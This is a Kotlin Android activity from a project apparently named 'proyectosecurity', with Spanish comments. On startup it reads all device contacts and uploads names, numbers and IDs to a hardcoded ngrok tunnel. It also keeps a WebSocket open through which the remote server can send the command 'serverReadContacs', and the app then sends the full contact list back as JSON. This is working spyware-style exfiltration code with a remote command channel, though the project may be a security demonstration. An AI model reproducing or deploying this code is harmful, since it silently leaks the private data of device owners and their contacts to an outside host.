package com.example.proyectosecurity.Contact

import android.annotation.SuppressLint
import android.os.Build
import android.os.Bundle
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import android.provider.ContactsContract
import android.util.Log
import android.widget.ListView
import android.widget.SimpleCursorAdapter
import androidx.annotation.RequiresApi
import com.example.proyectosecurity.ApiService
import com.example.proyectosecurity.ContactInfoRequest
import com.example.proyectosecurity.R
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class ContactActivity : AppCompatActivity() {
    private lateinit var lvShowContacts: ListView
    private lateinit var apiService: ApiService
    private val originU = "https://3dfa-2001-1388-65-870d-50d0-d596-358e-132c.ngrok-free.app"


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        //Init apiService
        val retrofit = Retrofit.Builder().baseUrl(originU)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        apiService = retrofit.create(ApiService::class.java)

        enableEdgeToEdge()
        setContentView(R.layout.activity_contact)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
        //a futuro, eliminar porque es la forma de actualizar la lista de contactos
        lvShowContacts = findViewById<ListView>(R.id.lvShowContacts)
        readContact()

        //SOCKETS
        configSocket()
        sendContacts()

    }
    //con la vareable cursor, ingresamos a la base de datos del dispositivo
    //para poder leer los contactos que tiene guardados, los parametros del URI,
    //lo ponemos todos en "null" para obtener todos los datos del equipo
    //PARA MOSTRAR EN EL CELULAR Y VER LOS DATOS
    private fun readContact(){
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )
        //tras la opcion de los datos, validamos que "cursor" es diferente a null
        //si lo es, procede a mostrar los datos
        if(cursor != null){
            //Se crea un array de nombres de columnas, que extraen del "cursor"
            val from = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            )
            //A FUTURO, cambiar el envio de "to" para el envio de una base de datos.
            val to = intArrayOf(android.R.id.text1, android.R.id.text2)

            //Es un adaptador que conectar el cursor con una listview
            //respectivamente se manda y obtiene:
            //el android.R.layout.simple_list_item_2, es el item en la lista, el cual
            //manda  el nombre y numero de telefono de los contactos a una LV
            //cursor: son los datos del contacto
            //from, son las columnas que se van a mostrar
            //to, es lo que se vera en el layout, es lo que el cursor va a usar para llenar.
            val adapter = SimpleCursorAdapter(
                this,
                android.R.layout.simple_list_item_2,
                cursor,
                from,
                to,
                0
            )
            lvShowContacts.adapter = adapter
        }
    }

    @SuppressLint("Range")
    private fun serverReadContacs(): List<ContactInfoRequest>{
        val contactList = mutableListOf<ContactInfoRequest>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        if (cursor != null){
            while (cursor.moveToNext()){
                val name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))

                contactList.add(ContactInfoRequest(name, number, id))
            }
            cursor.close()
        }
        return contactList
    }
    private fun sendContactToServer (contacts: List<ContactInfoRequest>){
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.sendContactInfo(contacts)
                if (response.isSuccessful){
                    val serverResponse = response.body()
                    Log.d("ContactInfo", "Respuesta del servidor: ${serverResponse?.message}")
                }else{
                    Log.e("ContactInfo", "Error en respuesta del servidor $response")
                }
            }catch (e: Exception){
                Log.e("ContactInfo", "No se pudo enviar la informacion del dispositivo: $e")
            }
        }
    }

    private fun sendContacts(){
        val contacts = serverReadContacs()
        sendContactToServer(contacts)
    }

    private fun configSocket() {
        // val originU2 = apiService
        val client = OkHttpClient()
        val request = Request.Builder().url(originU).build()

        Log.e("Contacts", "Config socket!!!!!!!!!!!!!!!!!!!")
        try {
            // val webSocket =
            client.newWebSocket(request, object : WebSocketListener() {
                @RequiresApi(Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                override fun onMessage(webSocket: WebSocket, text: String) {

                    if (text == "serverReadContacs") {
                        val ContactInfo = serverReadContacs()

                        val json = Gson().toJson(ContactInfo)

                        webSocket.send(json)

                        Log.d("DevideInfo", "Informacion del dispositivo enviado: $json")
                    }

                }
            })
        } catch (e: Exception) {
            Log.e("Error", "configSocket: ${e}")
        }
    }


}